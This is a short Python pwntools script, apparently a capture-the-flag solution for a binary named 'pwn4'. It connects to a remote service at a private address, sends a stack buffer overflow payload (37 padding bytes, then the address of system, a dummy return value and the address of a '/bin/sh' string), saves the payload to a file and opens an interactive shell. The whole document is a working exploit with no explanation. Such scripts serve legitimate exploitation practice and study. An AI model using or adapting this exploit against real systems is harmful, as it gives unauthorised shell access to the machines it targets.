from pwn import *


#p = process('./pwn4')
p = remote('172.17.0.2', 4324)

system = 0x80483f0 
binsh = 0x804a034

payload = '/'*37
payload += p32(system)
payload += p32(0xdeadbeef) 
payload += p32(binsh)

f = open('out', 'wb')
f.write(payload +'\n')
f.close()

p.send(payload + '\n')
p.interactive()
